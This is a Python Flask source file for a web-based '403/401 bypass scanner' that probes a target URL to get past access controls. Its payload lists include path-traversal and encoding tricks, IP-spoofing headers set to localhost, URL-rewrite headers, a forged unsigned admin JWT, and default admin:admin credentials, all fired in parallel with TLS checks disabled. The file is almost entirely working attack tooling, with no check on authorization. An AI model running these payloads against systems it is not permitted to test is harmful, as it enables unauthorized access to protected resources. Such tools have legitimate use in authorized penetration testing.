#!/usr/bin/env python3
"""
403/401 Bypass Scanner - Robust & Non-blocking
Run: python bypass_tool_fixed.py
"""

from flask import Flask, render_template_string, request, jsonify
import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import webbrowser
import signal
import sys

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

app = Flask(__name__)

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 10          # seconds per request
MAX_RETRIES = 1                # retry failed requests once
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ============================================================
# PAYLOADS (tested & effective)
# ============================================================

# HTTP methods (excluding problematic ones like TRACE/CONNECT by default)
SAFE_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]

# Path bypasses (most likely to work)
PATH_BYPASSES = [
    "",  # original path
    "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/",
    "/%2e%2e%2f", "/%252e%252e%252f", "/./", "//", "/;/",
    "/%61dmin/", "/%2561dmin/", "/ADMIN/", "/Admin/",
    "/admin/..;/", "/admin/..%3b/", "/admin%2f..%2f",
    "/admin/.", "/admin/../", "/admin/%2e/", "/admin/%2e%2e/",
    "/%2fadmin%2f", "/%252fadmin%252f", "/%c0%ae%c0%ae/",
    "/admin.json", "/admin.xml", "/admin.txt", "/admin.html"
]

# IP spoofing headers (most effective)
IP_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
    "X-Remote-Addr", "X-Forwarded-For-Original", "True-Client-IP",
    "X-Original-URL", "X-Rewrite-URL", "X-Proxy-URL", "X-Custom-IP-Authorization"
]
IP_VALUES = ["127.0.0.1", "localhost", "0.0.0.0", "::1", "10.0.0.1"]

# Special header combos (known bypasses)
SPECIAL_HEADERS = [
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "X-Forwarded-Port: 443",
    "X-Forwarded-Scheme: https",
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "Authorization: Basic YWRtaW46YWRtaW4="
]

# ============================================================
# SCANNER ENGINE (robust)
# ============================================================

scan_running = False
current_progress = 0
total_tests = 0
stop_flag = False
target_url = ""
proxy_dict = None
delay_sec = 0
threads_num = 10
original_status = None
original_length = None
scan_results = []
use_safe_methods = True  # skip TRACE, CONNECT, HEAD


def make_request(method, url, headers):
    """Single request with timeout and retry"""
    for attempt in range(MAX_RETRIES + 1):
        try:
            # Use session with connection adapter to avoid hanging
            session = requests.Session()
            session.keep_alive = False
            # Prepare request
            req = requests.Request(method, url, headers=headers)
            prep = session.prepare_request(req)
            resp = session.send(prep, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
            session.close()
            return resp.status_code, len(resp.content), resp.url
        except requests.exceptions.Timeout:
            if attempt == MAX_RETRIES:
                return None, 0, url
            time.sleep(0.5)
        except Exception:
            if attempt == MAX_RETRIES:
                return None, 0, url
            time.sleep(0.5)
    return None, 0, url


def test_single(payload):
    """Test one combination (method, test_type, payload_value)"""
    global stop_flag, delay_sec

    if stop_flag:
        return None

    if delay_sec > 0:
        time.sleep(delay_sec)

    method, test_type, test_value = payload

    try:
        if test_type == "method":
            # Just test different HTTP method on original URL
            status, length, final_url = make_request(method, target_url, {})
            if status and original_status in (403, 401):
                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
                    return (method, "Method tampering", f"Method: {method}", status, final_url)
                if status == 200 and length != original_length:
                    return (method, "Method tampering (content change)", f"Method: {method}", status, final_url)

        elif test_type == "path":
            # Append path bypass to original URL
            full_url = target_url.rstrip('/') + test_value
            status, length, final_url = make_request(method, full_url, {})
            if status and original_status in (403, 401):
                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
                    return (method, "Path bypass", f"Path: {test_value}", status, final_url)
                if status == 200 and length != original_length:
                    return (method, "Path bypass (content change)", f"Path: {test_value}", status, final_url)

        elif test_type == "header":
            # Add a header to original URL
            if ": " in test_value:
                k, v = test_value.split(": ", 1)
                headers = {k: v}
            else:
                headers = {}
            status, length, final_url = make_request(method, target_url, headers)
            if status and original_status in (403, 401):
                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
                    return (method, "Header injection", f"Header: {test_value}", status, final_url)
                if status == 200 and length != original_length:
                    return (method, "Header injection (content change)", f"Header: {test_value}", status, final_url)

        return None
    except Exception:
        return None


def scanner_worker():
    """Main scanning thread"""
    global scan_running, current_progress, scan_results, stop_flag
    global original_status, original_length, target_url, proxy_dict, delay_sec, threads_num, total_tests

    # 1. Get baseline
    try:
        base_status, base_length, _ = make_request("GET", target_url, {})
        original_status = base_status
        original_length = base_length
        if original_status is None:
            scan_results.append({"error": f"Cannot reach {target_url}", "status": 0})
            scan_running = False
            return
        print(f"[Baseline] {original_status} (length {original_length})")
    except Exception as e:
        scan_results.append({"error": f"Baseline failed: {str(e)}", "status": 0})
        scan_running = False
        return

    # 2. Build test cases
    work_items = []
    methods_to_use = SAFE_METHODS if use_safe_methods else ALL_METHODS

    # Method tests
    for method in methods_to_use:
        work_items.append((method, "method", ""))

    # Path bypasses with each method
    for method in methods_to_use:
        for path in PATH_BYPASSES:
            work_items.append((method, "path", path))

    # Header injection with each method
    for method in methods_to_use:
        for header in IP_HEADERS:
            for ip in IP_VALUES:
                work_items.append((method, "header", f"{header}: {ip}"))
        for special in SPECIAL_HEADERS:
            work_items.append((method, "header", special))

    total_tests = len(work_items)
    current_progress = 0
    stop_flag = False
    scan_results = []
    found_bypasses = []

    print(f"[*] Starting scan with {threads_num} threads. Total tests: {total_tests}")

    with ThreadPoolExecutor(max_workers=threads_num) as executor:
        future_to_idx = {executor.submit(test_single, item): idx for idx, item in enumerate(work_items)}

        for future in as_completed(future_to_idx):
            if stop_flag:
                break

            idx = future_to_idx[future]
            current_progress = idx + 1
            result = future.result()

            if result:
                method, test_type, payload, status, url = result
                found_bypasses.append({
                    "method": method,
                    "type": test_type,
                    "payload": payload if len(payload) < 200 else payload[:197] + "...",
                    "status": status,
                    "url": url
                })
                print(f"\n[✓] BYPASS [{status}] {method} - {test_type}: {payload[:80]} -> {url}")

                # Keep only last 100 results for UI
                scan_results = found_bypasses[-100:]

            # Update progress every 50 tests (optional UI refresh)
            if idx % 50 == 0:
                pass  # UI will poll anyway

    scan_running = False
    print(f"\n[*] Scan completed. Found {len(found_bypasses)} bypasses.")


# ============================================================
# WEB INTERFACE (with simple but effective UI)
# ============================================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>403/401 Bypass Scanner - Practical Tool</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #c0caf5;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 1300px;
            margin: auto;
        }
        h1 {
            color: #bb9af7;
            border-left: 4px solid #f7768e;
            padding-left: 15px;
        }
        .card {
            background: #1a1b2f;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2a2b3f;
        }
        .flex-row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            align-items: flex-end;
        }
        input, select, button {
            background: #0a0e27;
            border: 1px solid #3b4261;
            color: #c0caf5;
            padding: 8px 12px;
            border-radius: 6px;
            font-family: monospace;
        }
        button {
            background: #7aa2f7;
            color: #0a0e27;
            font-weight: bold;
            cursor: pointer;
            border: none;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .progress-bar-container {
            background: #2a2b3f;
            border-radius: 10px;
            margin: 10px 0;
        }
        .progress-bar {
            background: #9ece6a;
            width: 0%;
            height: 25px;
            border-radius: 10px;
            text-align: center;
            line-height: 25px;
            color: #0a0e27;
            font-weight: bold;
        }
        .results {
            background: #0a0e27;
            border-radius: 8px;
            padding: 10px;
            max-height: 500px;
            overflow-y: auto;
            font-size: 13px;
        }
        .result {
            border-left: 3px solid #9ece6a;
            padding: 8px;
            margin: 8px 0;
            background: #1a1b2f;
            border-radius: 4px;
        }
        .badge {
            background: #f7768e;
            color: #0a0e27;
            padding: 2px 6px;
            border-radius: 12px;
            font-size: 11px;
            margin-left: 8px;
        }
        .status-ok { color: #9ece6a; font-weight: bold; }
        hr { border-color: #2a2b3f; }
        .notice {
            background: #1f2335;
            border-left: 4px solid #e0af68;
            padding: 10px;
            font-size: 13px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 403/401 Bypass Scanner</h1>
    <div class="notice">
        ⚡ This scanner tests methods, path bypasses, and headers.<br>
        ➤ Timeout per request: 10 seconds (no hanging).<br>
        ➤ Problematic methods (TRACE/CONNECT/HEAD) are disabled by default.<br>
        ➤ Results appear instantly when a bypass is found.
    </div>

    <div class="card">
        <div class="flex-row">
            <input type="text" id="target" style="flex:3" placeholder="https://target.com/admin" value="https://example.com/admin">
            <input type="text" id="proxy" style="flex:1" placeholder="Proxy (optional)" value="">
        </div>
        <div class="flex-row" style="margin-top: 15px;">
            <label>🧵 Threads: <input type="number" id="threads" value="15" step="5" style="width: 70px;"></label>
            <label>⏱️ Delay (s): <input type="number" id="delay" value="0" step="0.1" style="width: 70px;"></label>
            <label><input type="checkbox" id="safeMethods" checked> Skip unsafe methods (TRACE/CONNECT/HEAD)</label>
            <button id="startBtn">▶ START SCAN</button>
            <button id="stopBtn" disabled>⏹ STOP</button>
            <button id="exportBtn" disabled>💾 Export</button>
        </div>
    </div>

    <div class="card">
        <h3>Progress</h3>
        <div class="progress-bar-container"><div class="progress-bar" id="progressBar">0%</div></div>
        <div id="statusText">Ready. Click Start.</div>
        <div>✅ Bypasses found: <span id="foundCount" style="color:#9ece6a;">0</span></div>
    </div>

    <div class="card">
        <h3>Successful bypasses</h3>
        <div id="results" class="results">No bypasses yet.</div>
    </div>
</div>

<script>
    let pollInterval;

    function startScan() {
        const target = document.getElementById('target').value;
        const proxy = document.getElementById('proxy').value;
        const threads = parseInt(document.getElementById('threads').value);
        const delay = parseFloat(document.getElementById('delay').value);
        const safeMethods = document.getElementById('safeMethods').checked;

        if (!target) { alert("Enter target URL"); return; }

        fetch('/start', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, proxy, threads, delay, safeMethods})
        }).then(r => r.json()).then(data => {
            if (data.status === 'ok') {
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                document.getElementById('exportBtn').disabled = true;
                if (pollInterval) clearInterval(pollInterval);
                pollInterval = setInterval(fetchStatus, 1000);
            } else alert("Error: " + data.error);
        });
    }

    function stopScan() {
        fetch('/stop').then(() => {
            clearInterval(pollInterval);
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('exportBtn').disabled = false;
        });
    }

    function exportResults() {
        fetch('/export').then(r => r.json()).then(data => {
            if (data.results && data.results.length) {
                let text = data.results.map(r => `[${r.status}] ${r.method} ${r.type}: ${r.payload} -> ${r.url}`).join('\n');
                const blob = new Blob([text], {type: 'text/plain'});
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `bypass_${new Date().toISOString().slice(0,19)}.txt`;
                a.click();
                URL.revokeObjectURL(a.href);
            } else alert("No results to export");
        });
    }

    function fetchStatus() {
        fetch('/status').then(r => r.json()).then(data => {
            const percent = data.total > 0 ? (data.progress / data.total * 100).toFixed(1) : 0;
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('progressBar').innerText = percent + '%';
            document.getElementById('statusText').innerHTML = data.running ? `Scanning... ${data.progress}/${data.total}` : (data.progress === data.total ? "Scan completed." : "Ready.");
            document.getElementById('foundCount').innerText = data.results.length;

            if (data.results.length > 0) {
                let html = '';
                for (let i = data.results.length-1; i >= 0; i--) {
                    const r = data.results[i];
                    html += `<div class="result">
                        <span class="status-ok">[${r.status}]</span> <strong>${r.method}</strong> - ${r.type}<br>
                        <span style="font-size:12px;">${escapeHtml(r.payload)}</span><br>
                        <span style="font-size:11px; color:#565f89;">→ ${r.url}</span>
                    </div>`;
                }
                document.getElementById('results').innerHTML = html;
            }

            if (!data.running && data.progress === data.total) {
                clearInterval(pollInterval);
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                document.getElementById('exportBtn').disabled = false;
            }
        });
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];
        });
    }

    document.getElementById('startBtn').onclick = startScan;
    document.getElementById('stopBtn').onclick = stopScan;
    document.getElementById('exportBtn').onclick = exportResults;
</script>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route('/start', methods=['POST'])
def start():
    global scan_running, target_url, proxy_dict, delay_sec, threads_num, use_safe_methods, stop_flag, current_progress, scan_results, total_tests
    if scan_running:
        return jsonify({"status": "error", "error": "Scan already running"})

    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({"status": "error", "error": "Target required"})
    target_url = target
    proxy = data.get('proxy')
    proxy_dict = {'http': proxy, 'https': proxy} if proxy else None
    delay_sec = float(data.get('delay', 0))
    threads_num = int(data.get('threads', 15))
    use_safe_methods = data.get('safeMethods', True)

    stop_flag = False
    scan_running = True
    current_progress = 0
    scan_results = []

    thread = threading.Thread(target=scanner_worker)
    thread.daemon = True
    thread.start()
    return jsonify({"status": "ok"})


@app.route('/stop')
def stop():
    global stop_flag, scan_running
    stop_flag = True
    scan_running = False
    return jsonify({"status": "ok"})


@app.route('/status')
def status():
    global scan_running, current_progress, total_tests, scan_results
    return jsonify({
        "running": scan_running,
        "progress": current_progress,
        "total": total_tests,
        "results": scan_results[-100:]
    })


@app.route('/export')
def export():
    global scan_results
    return jsonify({"results": scan_results})


if __name__ == '__main__':
    print("=" * 60)
    print("403/401 Bypass Scanner - Robust Edition")
    print("=" * 60)
    print("Starting web server at http://localhost:5000")
    print("Click Start and watch for bypasses.")
    print("Requests have a 10-second timeout - no hanging.\n")
    webbrowser.open('http://localhost:5000')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
